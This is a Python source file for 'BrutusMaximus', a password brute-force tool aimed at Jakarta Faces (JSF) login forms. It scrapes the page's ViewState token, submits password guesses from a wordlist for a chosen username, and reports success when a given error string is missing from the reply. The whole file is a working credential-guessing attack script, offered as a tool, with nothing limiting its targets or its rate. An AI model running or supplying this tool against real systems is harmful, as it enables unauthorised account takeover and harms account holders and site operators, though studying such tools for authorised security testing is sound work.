import argparse
import threading
import requests
from bs4 import BeautifulSoup

class BrutusMaximus:
    def __init__(self, url, username, errorstring):
        self.url = url
        self.username = username
        self.errorstring = errorstring
        self.session = requests.Session()

    def attempt_brutus(self, password):
        get_resp = self.session.get(self.url)
        soup = BeautifulSoup(get_resp.text, "html.parser")

        view_state_input = soup.find("input",{"name": "jakarta.faces.ViewState"})
        if not view_state_input:
            print("Could not find viewstate")

        view_state = view_state_input.get("value", "")

        post_data = {
                "form_loginDialog": "form_loginDialog",         
                "form_loginDialog:userName": self.username,
                "form_loginDialog:login_password": password,
                "form_loginDialog:loginButton": "",
                "jakarta.faces.ViewState": view_state
                }
        post_response = self.session.post(self.url, data=post_data)

        if self.errorstring in post_response.text:
            print(f"{self.username}:{password} = FAILED")
            return False
        else:
            print(f"{self.username}:{password} = SUCCESS")
            return True

def main():
    parser = argparse.ArgumentParser(description="BrutusMaximus - Brute Forcer of the Colesseum")
    
    parser.add_argument('-u', '--url', required=True, help='Target URI')
    parser.add_argument('-n', '--username', required=True, help='Username to send brutus on')
    parser.add_argument('-e', '--errorstring', required=True, help='Error message to detect SUCCESS')
    parser.add_argument('-wl', '--wordlist', required=True, help='Path absolute/relative to password wordlist')

    args = parser.parse_args()

    brutus = BrutusMaximus(args.url, args.username, args.errorstring)

    
    try:
        with open (args.wordlist, "r") as f:
            for password in f:
                password = password.strip()
                if brutus.attempt_brutus(password):
                    print(f"Brutus has found the password: {password}")
                    break
    except FileNotFoundError:
        print("Directory not found")

if __name__ == "__main__":
    main()

